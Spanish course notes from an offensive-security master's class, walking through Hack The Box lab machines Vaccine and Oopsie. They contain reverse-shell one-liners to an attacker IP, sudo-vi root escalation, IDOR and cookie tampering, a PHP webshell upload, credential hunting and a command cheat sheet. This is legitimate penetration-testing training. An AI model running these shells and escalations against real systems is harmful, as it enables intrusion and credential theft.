---
tags:
- Máquinas y prácticas
date: '2026-06-12'
---

# Repaso Semanal Vaccine Oopsie

<p class="note-meta">2026-06-12</p>

**EVOLVE ACADEMY · Máster en Ciberseguridad Ofensiva**

# Repaso semanal I — Cierre de Vaccine + Máquina Oopsie

**Sesión del 12/06/2026** · Estabilización de TTY · GTFOBins · IDOR · Cookies · Upload · LinPEAS

| **ℹ Resumen de la sesión**  Clase de repaso semanal con Yuba. Dos bloques: **(A)** cerrar lo que faltaba de **Vaccine** —pasar de la os-shell de SQLMap a una **reverse shell estable**, la **receta completa de estabilización de TTY**, y la **escalada a root** con sudo -l + GTFOBins (/bin/vi)— y **(B)** resolver entera la siguiente máquina, **Oopsie** («Upsi»): enumeración web, **IDOR**, manipulación de **cookies**, subida de **webshell**, y enumeración para escalada con **LinPEAS**.  En Oopsie se llega hasta el usuario **robert** (user.txt) y se identifica el vector de root (grupo **bugtracker**); la explotación final de privilegios se deja para el módulo dedicado. |
| --- |

## Conexión con sesiones anteriores

- **Cierra Vaccine**, vista el 10/06 (completa) y el 11/06 (en profundidad). Aquí se completa la parte que había quedado pendiente: estabilización de la shell y escalada de privilegios.
- **Oopsie** es la máquina que se previó el 10/06 (IDOR + cookies + upload). Hoy se resuelve de principio a fin (salvo la escalada final).
- Se reutilizan técnicas ya vistas: nmap, FTP anónimo, zip2john+John, **CrackStation** (Rainbow Tables), SQLMap con cookie, --os-shell, reverse shells de **revshells.com**.
- Aparecen herramientas y técnicas **transversales** nuevas que se usarán en casi todas las máquinas: estabilización de TTY, transferencia de archivos y **LinPEAS**.

# Parte A · Cierre de Vaccine (lo que faltaba)

Repaso exprés hasta el punto pendiente: FTP anónimo → backup.zip → zip2john+John → MD5 (CrackStation) → login admin:qwerty789 → SQLi → SQLMap con cookie → --os-shell (usuario postgres). Desde ahí, lo nuevo de hoy:

## A.1 De la os-shell a una reverse shell estable

La os-shell de SQLMap es incómoda y frágil. Nos enviamos una reverse shell propia. El instructor recomienda **revshells.com** para no memorizar payloads; la que «casi siempre» le funciona es la de **netcat / mkfifo**.

| **Reverse shell con netcat/mkfifo** |
| --- |
| *En tu Kali: ponerse a la escucha (puerto ALTO; los puertos bajos no van)*  $ nc -lvnp 4444  *Desde la os-shell: payload netcat/mkfifo de revshells.com (TU IP y puerto)*  $ rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.185 4444 >/tmp/f |
| **⚠ Detalle que falla a todo el mundo: el puerto**  Usar **puertos altos** (4444, 8000, 9000...). Los **puertos bajos** (como 444) no funcionan. Y comprobar siempre que la **IP** del payload es la tuya de HTB (la tun0, que aparece arriba a la derecha en HTB), no la de la víctima. |
| **✔ Si una reverse shell no conecta — probar otra**  No todas funcionan en toda máquina (depende de lo instalado y del firewall). Si la primera no tira, prueba otra de revshells.com: la de **bash** (bash -i >& /dev/tcp/IP/PORT 0>&1), la de **Python**, etc. En Windows se usan otras (PowerShell IEX, Nishang...), que a veces son \*flageadas\* por el AV. |

## A.2 Receta completa de estabilización de la TTY

La shell de netcat es «tonta»: no hay Ctrl+C útil, ni historial, ni autocompletado, ni editores (vi/nano). Esta secuencia la convierte en una TTY completa tipo SSH. **Conviene memorizarla** (se usa en casi todas las máquinas).

| **Estabilización de TTY (secuencia completa)** |
| --- |
| *1) Spawnear una PTY con Python (OJO: python3)*  $ python3 -c 'import pty;pty.spawn("/bin/bash")'  *2) Suspender la shell remota (vuelve a tu Kali)*  [Ctrl+Z]  *3) En tu Kali: terminal en crudo (pasa Ctrl+C/Ctrl+Z a la remota) + traerla*  $ stty raw -echo; fg  *4) Reparar la pantalla y definir el tipo de terminal*  $ reset  $ export TERM=xterm # o xterm-256color para colores |
| **ℹ Qué hace cada paso**  pty.spawn crea una **pseudoterminal** y lanza bash dentro → shell algo más decente. Ctrl+Z la **suspende** (no la mata) y vuelve a tu Kali. stty raw -echo pone tu terminal en **crudo** (deja de procesar localmente las teclas y las pasa tal cual a la remota; -echo quita el doble eco) y fg la trae de vuelta. reset limpia la pantalla rota y export TERM=xterm permite que vi, clear, top funcionen. |
| **⚠ La estabilidad va por porcentaje**  SSH ≈ 100% estable; una reverse shell de netcat puede romperse. Algunos comandos pueden no ir (p. ej. ifconfig) → usar ip a. Si tras estabilizar se «come» alguna tecla (p. ej. el 0), suele ser la propia estabilización: rehacer la secuencia. |

## A.3 Escalada de privilegios a root

Como postgres (vía netcat) no podemos hacer sudo -l (pide contraseña que no tenemos). Toca **enumerar** hasta encontrar una credencial reutilizable.

| **Enumeración → credenciales en dashboard.php** |
| --- |
| *Mirar dónde se aloja la web (ahi suele haber credenciales de BBDD)*  $ cd /var/www/html  $ cat dashboard.php  -> conexion a BBDD local: host localhost, puerto 5432, user postgres, password <...>  *Confirmar el servicio local (PostgreSQL en 5432)*  $ netstat -ano (o: ss -tlnp) |
| **ℹ Reutilización de contraseñas**  La credencial es «de la base de datos», pero los administradores **reutilizan** contraseñas. Por eso merece la pena probarla por **SSH**. Regla: probar **todas** las credenciales contra **todos** los servicios y usuarios, pero sabiendo por qué se prueba. |
| **SSH + sudo -l** |
| *Reutilizar la contraseña por SSH (shell 100% estable)*  $ ssh postgres@<IP>  $ cat user.txt  *Ya con contraseña, comprobar permisos sudo*  $ sudo -l  -> (ALL) /bin/vi /etc/postgresql/11/main/pg\_hba.conf |

sudo -l dice que postgres puede ejecutar **`/bin/vi`** sobre ese fichero **como cualquier usuario (incluido root)**. Parece inofensivo (solo editar un archivo), pero vi puede **lanzar una shell**, y como se ejecuta como root, la shell será de root. Recurso: **GTFOBins** (buscar el binario + contexto sudo).

| **Escalada con vi (GTFOBins)** |
| --- |
| *Abrir el fichero permitido CON sudo (ruta EXACTA de sudo -l)*  $ sudo /bin/vi /etc/postgresql/11/main/pg\_hba.conf  *Dentro de vi, en modo comando (dos puntos), escapar a una shell:*  $ :!/bin/bash (o :set shell=/bin/bash y luego :shell )  *Ya como root*  $ id  $ cat /root/root.txt |
| **⛔ El matiz que confunde a todos**  La ruta importa: sudo /bin/vi /etc/postgresql/11/main/pg\_hba.conf corre como **root** (es la ruta permitida en sudo -l). Si abres sudo /bin/vi user.txt (ruta NO permitida), vi corre como postgres y la shell que abras será de postgres, no de root. Quien ejecuta vi es quien «hereda» la shell. |

# Parte B · Máquina Oopsie (nueva)

Web PHP (MegaCorp Automotive). La cadena hasta usuario:

| **nmap (22, 80)** | **→** | **Fuzzing → /cdn-cgi/login** | **→** | **Login as guest** | **→** | **IDOR (id=1 → admin)** |
| --- | --- | --- | --- | --- | --- | --- |

| **Cookie → admin** | **→** | **Upload webshell PHP** | **→** | **Shell www-data + TTY** | **→** | **user.txt** |
| --- | --- | --- | --- | --- | --- | --- |

| **db.php → cred robert** | **→** | **SSH robert** | **→** | **LinPEAS** | **→** | **grupo bugtracker → root (pendiente)** |
| --- | --- | --- | --- | --- | --- | --- |

## B.1 Reconocimiento

| **Nmap** |
| --- |
| *Escaneo (2 puertos: 22 SSH, 80 HTTP)*  $ nmap -p- --min-rate 5000 <IP> && nmap -sCV -p22,80 <IP> |

En la web: navegar todos los botones (about, contact, services), buscar parámetros, y revisar el **código fuente con Ctrl+U**. Ahí aparece admin@megacorp.com y una referencia a un script en **`/cdn-cgi/login`**.

## B.2 Fuzzing de directorios

Descubrimiento de rutas. Vale Dirsearch, pero hoy se usa **FeroxBuster** (recursivo y con colores).

| **Fuzzing con FeroxBuster** |
| --- |
| $ feroxbuster -u http://<IP>  -> /images, /uploads (interesante!), /cdn-cgi/login  *Lanzar con un segundo diccionario por si se escapa algo*  $ feroxbuster -u http://<IP> -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt |
| **Si FeroxBuster falla...** | **Alternativa** |
| Could not connect to target | Revisar que la **IP** es correcta y la VPN activa (ping <IP>) |
| Otra herramienta | dirsearch -u http://<IP> · gobuster dir -u http://<IP> -w <wordlist> · ffuf -u http://<IP>/FUZZ -w <wordlist> |

## B.3 IDOR — acceso a datos de otros usuarios

En /cdn-cgi/login hay un **«Login as guest»**. Dentro, la URL tiene un parámetro **`id`**. Iterando el número se accede a datos de otros usuarios — incluido el **admin** (id=1), del que obtenemos su **Access ID**.

| **Patrón IDOR** |
| --- |
| *Como guest, la URL trae un id (p. ej. id=2)*  http://<IP>/cdn-cgi/login/admin.php?content=accounts&id=2  *Iterar el id -> datos del administrador (Access ID, role...)*  $ http://<IP>/cdn-cgi/login/admin.php?content=accounts&id=1 |
| **ℹ Qué es IDOR y por qué importa**  **IDOR** (Insecure Direct Object Reference / \*Broken Object Level Authorization\*): acceder a objetos de otros cambiando un identificador directo. **Siempre que veas algo iterable (un `id`), pruébalo.** El instructor lo ha encontrado en la realidad: historiales clínicos de una plataforma de salud accesibles iterando un identificador. |

## B.4 Manipulación de cookies → admin

Con el **Access ID** del admin obtenido por IDOR, editamos nuestras cookies (cambiar el valor de usuario/role por el del admin) con **Cookie Editor** o desde **Storage → Cookies**. Al refrescar, ya somos administradores y se desbloquea la zona que «requería super admin».

| **✔ Encadenamiento**  IDOR (leer el Access ID del admin) → Cookie tampering (suplantar al admin). Es **encadenar** vulnerabilidades: ir viendo cómo funciona cada pieza y unirlas. |
| --- |

## B.5 Subida de webshell → shell de www-data

La zona admin permite **subir archivos**. Como el backend es **PHP**, subimos una **reverse shell PHP** (la php-reverse-shell de revshells, editada con vi para poner nuestra IP/puerto). El listado de /uploads puede estar **prohibido** (forbidden), pero si conocemos el **nombre exacto** del fichero, accedemos directamente y se ejecuta.

| **Webshell → www-data → TTY estable** |
| --- |
| *1) En tu Kali: editar la reverse shell PHP y ponerse a la escucha*  $ nc -lvnp 4444  *2) Subir shell.php por el panel admin -> acceder directo al fichero*  $ http://<IP>/uploads/shell.php  -> conexion recibida como www-data  *3) Estabilizar la TTY (misma receta de la Parte A.2)*  $ python3 -c 'import pty;pty.spawn("/bin/bash")' ... stty raw -echo; fg ... export TERM=xterm-256color |
| **⚠ Listado prohibido ≠ archivo inaccesible**  Aunque /uploads/ devuelva \*forbidden\* (sin \*directory listing\*), si conoces el **nombre** del fichero subido puedes abrirlo directamente. No hace falta listar el directorio. |

## B.6 user.txt y caza de credenciales (db.php) → SSH robert

Como www-data, en /home hay un usuario **robert** cuyo user.txt podemos leer. Para seguir, hay que **enumerar** el código de la web buscando credenciales. En /var/www/html/cdn-cgi/login/db.php está la **contraseña de robert**.

| **Caza de credenciales → SSH** |
| --- |
| *Localizar la flag (siempre en la carpeta del usuario)*  $ find / -name user.txt 2>/dev/null  $ cat /home/robert/user.txt  *Caza de credenciales: leer el codigo de la web*  $ cat /var/www/html/cdn-cgi/login/db.php  -> credenciales del usuario robert  *Reutilizar por SSH*  $ ssh robert@<IP> |
| **✔ Búsqueda masiva de credenciales (manual)**  Para no ir fichero por fichero: grep -riI pass /var/www/html 2>/dev/null busca «pass» de forma recursiva, ignorando mayúsculas (-i) y binarios (-I). Equivalente con find: find . -type f -exec cat {} \; 2>/dev/null | grep -i pass. Útil para encontrar contraseñas, conexiones a BBDD, etc. |

## B.7 Hacia root: enumeración con LinPEAS

Como robert, sudo -l no sirve (sin permisos). Toca enumerar para encontrar el vector de escalada. Para automatizarlo: **LinPEAS** (de Carlos Polop, creador de **HackTricks**).

| **ℹ Pista del vector: el grupo del usuario**  Un comando que nunca falta: id. Aquí revela que robert pertenece a un grupo poco habitual: **`bugtracker`**. Pertenecer a un grupo «raro» suele dar permisos de más → es el **vector de escalada a root**. Su explotación (binario SUID bugtracker) se verá en el módulo de escalada de privilegios. |
| --- |
| **⚠ Estado de la máquina**  Oopsie queda **hasta usuario robert + identificación del vector** (bugtracker). La escalada final a root se deja para el bloque dedicado de \*privilege escalation\* (3 semanas de prácticas). |

# Parte C · Técnicas transversales (toolbox)

Técnicas que se usarán en casi todas las máquinas a partir de ahora.

## C.1 Transferencia de archivos a la máquina víctima

La máquina de HTB **no tiene Internet**, así que no puede descargar herramientas directamente. Se levanta un **servidor HTTP en la Kali** y se descarga desde la víctima con curl/wget.

| **Transferencia con http.server + curl/wget** |
| --- |
| *En tu Kali (carpeta con el fichero, p. ej. linpeas.sh): servidor HTTP*  $ python3 -m http.server 8000  *En la victima: descargar el fichero*  $ curl http://10.10.14.185:8000/linpeas.sh -o linpeas.sh  $ (o) wget http://10.10.14.185:8000/linpeas.sh |
| **✔ Alternativas de transferencia**  Subir por el propio **/uploads** de la web (si existe). Por **FTP** si está disponible. Con **scp** si tenemos SSH. Existen además \*wrappers\* tipo **parsing\_peas** que automatizan: descargan LinPEAS/winPEAS en la víctima, lo ejecutan y devuelven el resultado a la Kali en **HTML** (más cómodo de revisar). El instructor tiene un prework dedicado a transferencia de archivos. |

## C.2 Enumeración automatizada: LinPEAS / winPEAS

| **Ejecutar LinPEAS** |
| --- |
| *En la victima, dar permisos y ejecutar*  $ chmod +x linpeas.sh  $ ./linpeas.sh |

- **LinPEAS** (Linux) / **winPEAS** (Windows): enumeran el sistema y marcan posibles vías de escalada.
- Código de color: **rojo+amarillo** = muy interesante, revisar a fondo (probable vía de escalada); **rojo** = revisar.
- Detecta: versión de sudo, **CVEs de kernel**, **capabilities**, **SUID**, servicios (Apache, MySQL), grupos, AppArmor, etc.

| **ℹ Cuándo usarlo**  El 80% del hacking es **enumerar**; si no encuentras algo, es que has enumerado mal. LinPEAS automatiza esa enumeración, pero conviene saber también enumerar a mano (grupos con id, SUID, crontabs, credenciales en ficheros). |
| --- |

## C.3 Adelanto del módulo de escalada

- **SUID:** binarios que se ejecutan con permisos del propietario. Buscarlos: find / -perm -4000 -type f 2>/dev/null. (El binario bugtracker de Oopsie es de este tipo.)
- **Crontabs:** tareas programadas que pueden ejecutarse como root; si un script es modificable, se puede inyectar payload.
- **Grupos peligrosos:** pertenecer a grupos como docker, lxd, disk o uno a medida (bugtracker) suele dar más permisos de los debidos.
- **GTFOBins:** referencia para abusar de binarios con sudo/SUID. **HackTricks** como enciclopedia general.

# Chuleta rápida de comandos (con alternativas)

| **Acción** | **Comando principal** | **Alternativa / si falla** |
| --- | --- | --- |
| Reverse shell | rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc IP PORT >/tmp/f | bash -i >& /dev/tcp/IP/PORT 0>&1 · revshells.com |
| Listener | nc -lvnp 4444 (puerto ALTO) | rlwrap nc -lvnp 4444 · pwncat-cs -lp 4444 |
| Estabilizar TTY | python3 -c 'import pty;pty.spawn("/bin/bash")' | script -qc /bin/bash /dev/null · socat |
| ...continuación | Ctrl+Z → stty raw -echo; fg → reset → export TERM=xterm | — |
| Si ifconfig no va | ip a | — |
| Ver privilegios | sudo -l | id (grupos) · LinPEAS · find / -perm -4000 |
| Escalar (sudo binario) | sudo /bin/vi <ruta\_permitida> → :!/bin/bash | Consultar el binario en **GTFOBins** |
| Fuzzing web | feroxbuster -u http://<IP> | dirsearch · gobuster dir · ffuf -u .../FUZZ |
| Subir webshell | Panel de upload → http://<IP>/uploads/shell.php | revshells.com (PHP) editada con IP/puerto |
| Caza de credenciales | grep -riI pass /var/www/html 2>/dev/null | find . -type f -exec cat {} \; | grep -i pass |
| Localizar flag | find / -name user.txt 2>/dev/null | Mirar /home/<user>/ y Desktop |
| Servir archivo (Kali) | python3 -m http.server 8000 | php -S 0.0.0.0:8000 · updog |
| Descargar (víctima) | curl http://IP:8000/f -o f | wget http://IP:8000/f |
| Enumerar todo | ./linpeas.sh | winPEAS (Windows) · parsing\_peas (HTML) |

# Herramientas utilizadas en la sesión

| **Herramienta** | **Objetivo** | **Fase** | **Comando / uso visto** | **Nivel** |
| --- | --- | --- | --- | --- |
| revshells.com | Generar reverse shells | Explotación | netcat/mkfifo, bash, php | Practicado |
| netcat (nc) | Listener de reverse shell | Explotación | nc -lvnp 4444 (puerto alto) | Recurrente |
| python3 pty / stty | Estabilizar la TTY | Post-explotación | pty.spawn, stty raw -echo, reset | Practicado |
| SQLMap | Inyección SQL (Vaccine) | Explotación web | --cookie, --os-shell | Recurrente |
| GTFOBins / vi | Escalada vía sudo binario | Escalada | sudo /bin/vi ... → :!/bin/bash | Practicado |
| netstat / ss | Ver puertos/servicios locales | Enumeración | netstat -ano, ss -tlnp | Introducido |
| FeroxBuster | Fuzzing de directorios web | Enumeración web | feroxbuster -u http://<IP> | Practicado |
| Cookie Editor | Editar cookies (IDOR→admin) | Web | cambiar Access ID/role | Practicado |
| find / grep | Caza manual de credenciales | Enumeración | grep -riI pass, find -exec cat | Introducido |
| ssh | Reutilización de credenciales | Acceso | ssh robert@<IP> | Recurrente |
| python3 http.server | Servidor para transferir | Transferencia | python3 -m http.server 8000 | Introducido |
| curl / wget | Descargar en la víctima | Transferencia | curl http://IP:8000/f -o f | Recurrente |
| LinPEAS / winPEAS | Enumeración automatizada | Escalada | ./linpeas.sh | Introducido |
| id | Ver grupos del usuario | Enumeración | id → grupo bugtracker | Recurrente |

## Checklist de la sesión

- **Vaccine:** os-shell → reverse shell (revshells, puerto alto) → **estabilizar TTY** → dashboard.php (cred) → SSH → sudo -l → /bin/vi (GTFOBins) → root.
- **Oopsie:** nmap → web + Ctrl+U (/cdn-cgi/login) → FeroxBuster (/uploads) → \*Login as guest\*.
- **Oopsie:** IDOR (iterar id → Access ID del admin) → cookie tampering → admin → subir webshell PHP → www-data + TTY.
- **Oopsie:** user.txt → db.php (cred robert) → SSH robert → LinPEAS → id (grupo **bugtracker** = vector de root).
- **Transversal:** transferencia con http.server+curl/wget; enumeración con LinPEAS; caza de credenciales con grep -rI.

## Actualización del registro de herramientas

- **Nuevas:** revshells.com (Practicada), receta de **estabilización de TTY** (Practicada), **FeroxBuster** (Practicada), **LinPEAS/winPEAS** (Introducida), python3 -m http.server (Introducida), netstat/ss (Introducida), caza de credenciales grep -rI/find -exec (Introducida), **parsing\_peas** (Mencionada).
- **Suben de nivel:** **GTFOBins** + vi → Practicada (escalada completada); **Cookie Editor** → Practicada (IDOR→admin); curl/wget y ssh → Recurrente (transferencia y reutilización).
- **Conceptos nuevos:** **IDOR**, \*cookie tampering\*, subida de webshell, transferencia de archivos, enumeración automatizada, y adelanto de **SUID / crontabs / grupos peligrosos**.
- **Pendiente (módulo de escalada):** explotación del grupo **bugtracker** (SUID) para cerrar Oopsie; siguientes máquinas del Tier 2.

*Evolve Academy · Máster en Ciberseguridad Ofensiva · Sesión 12/06/2026 · Repaso semanal I (Vaccine + Oopsie)*
